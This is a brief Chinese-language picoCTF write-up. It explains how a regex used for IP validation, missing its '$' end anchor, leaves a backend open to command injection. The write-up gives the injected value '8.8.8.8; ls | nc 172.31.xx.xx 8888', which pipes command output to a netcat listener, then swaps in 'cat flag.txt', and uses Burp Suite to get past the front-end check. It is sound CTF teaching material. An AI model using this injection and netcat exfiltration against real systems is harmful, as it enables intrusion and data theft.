```
漏洞:
1. /^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/ 
   少了 $ ，存在 command injection 漏洞
```

[正規表示式](http://ccckmit.wikidot.com/regularexpression)

```
解題流程：

因為後端存在 command injection 漏洞
因此，只要將 ip 設為 8.8.8.8; ls | nc 172.31.xx.xx 8888
並在 picoCTF 的 shell 監聽 port 8888 即可得到 ls 的內容
接著將 ls 改為 cat flag.txt 即可拿到 flag

note:
1. 172.31.xx.xx 是你在 picoCTF 的 shell 的 ip (可用 ifconfig 查詢)
2. 因為漏洞存在後端，因此必須將指令直接傳到後端 (可用 burpsuite 做到)
3. 不一定要使用 8888 ，只要該 port 沒在使用就有機會利用
4. nc -lvnp 8888 可用來監聽 (務必在 picoCTF 的 shell 上)

整體流程
1. ssh 到 picoCTF 的 server
2. ifconfig 找到 inet addr
3. nc -lvnp 8888
4. 利用 burpsuite 讓 ip = 8.8.8.8; ls | nc 172.31.xx.xx 8888 (這步不能在前端做，看 source code 就知道會被擋住且不會傳到後端)
